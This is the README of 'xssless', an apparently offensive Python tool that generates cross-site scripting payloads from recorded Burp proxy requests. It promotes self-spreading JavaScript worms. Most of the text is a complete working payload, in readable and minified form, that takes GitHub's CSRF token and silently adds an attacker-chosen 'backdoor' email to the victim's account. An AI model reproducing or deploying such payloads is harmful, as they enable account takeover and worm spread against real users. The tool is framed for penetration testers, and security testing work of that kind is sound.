xssless
======

An automated XSS payload generator written in python.

Usage
-----

1. Record request(s) with [Burp proxy](http://portswigger.net/burp/proxy.html)
2. Select request(s) you want to generate, then right click and select "Save items"
3. Use xssless to generate your payload: `./xssless.py burp_export_file`
4. Pwn!

Features
--------
* Automated XSS payload generation from imported Burp proxy requests
* Payloads are 100% asynchronous and won't freeze the user's browser
* CSRF tokens can be easily extracted and set via the -p option
* Crazy JavaScript worms with no hassle!

Upcoming
--------
* POST multipart support for file uploads via XSS
* Self POSTing for propagating script itself

Installation
------------

If you don't have BeautifulSoup installed:

`pip install beautifulsoup4`

Download the latest xssless:

`git clone https://github.com/mandatoryprogrammer/xssless`

Run the script:

`./xssless.py -h`

Example Payload
---------------

This is an example XSS payload output (unminimized) for my github that would add an extra email to my account (backdoor@yopmail.com)

```html
<script type="text/javascript">
    var funcNum = 0;
    function doRequest(url, method, body)
    {
        var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
        http.withCredentials = true;
        http.onreadystatechange = function() {
            if (this.readyState == 4) {
                var response = http.responseText; 
                var d = document.implementation.createHTMLDocument("");
                d.documentElement.innerHTML = response;
                requestDoc = d;
                funcNum++;
                try {
                    window['r' + funcNum](requestDoc);
                } catch (error) {}
            }    
        };
        if(method == "POST")
        {
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.setRequestHeader('Content-length', body.length);
            http.setRequestHeader('Connection', 'close');
            http.send(body);
        } else if (method == "GET") {
            http.open('GET', url, true); 
            http.send();
        } else if (method == "HEAD") {
            http.open('HEAD', url, true); 
            http.send();
        }
    }
    r0();
    function r0(requestDoc){
        doRequest('https://github.com/settings/profile', 'GET', '');
    }

    function r1(requestDoc){
        doRequest('https://github.com/users/mandatoryprogrammer/emails', 'POST', 'authenticity_token=' + encodeURIComponent(requestDoc.getElementsByName('authenticity_token')[0].value) + '&user_email%5Bemail%5D=backdoor%40yopmail.com');
    }

</script>
```

The compressed payload
```html
<script type="text/javascript">
function doRequest(e,t,n){var r=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP");r.withCredentials=true;r.onreadystatechange=function(){if(this.readyState==4){var e=r.responseText;var t=document.implementation.createHTMLDocument("");t.documentElement.innerHTML=e;requestDoc=t;funcNum++;try{window["r"+funcNum](requestDoc)}catch(n){}}};if(t=="POST"){r.open("POST",e,true);r.setRequestHeader("Content-type","application/x-www-form-urlencoded");r.setRequestHeader("Content-length",n.length);r.setRequestHeader("Connection","close");r.send(n)}else if(t=="GET"){r.open("GET",e,true);r.send()}else if(t=="HEAD"){r.open("HEAD",e,true);r.send()}}function r0(e){doRequest("https://github.com/settings/profile","GET","")}function r1(e){doRequest("https://github.com/users/mandatoryprogrammer/emails","POST","authenticity_token="+encodeURIComponent(e.getElementsByName("authenticity_token")[0].value)+"&user_email%5Bemail%5D=backdoor%40yopmail.com")}var funcNum=0;r0()
</script>
```

Contributing
------------

Want to contribute some code to this project? Great! I'm not the best at Python or Javascript so I appreciate any additions to the project. Contributions can also be in the form of new feature ideas, if you've got one let me know!

The Joke
--------

Just to point out, the joke in the name here is really to xss-LESS, ie. stop putting so much time into building payloads! Not to be without XSS which would be a sad state indeed (well, for the pentester anyways!).

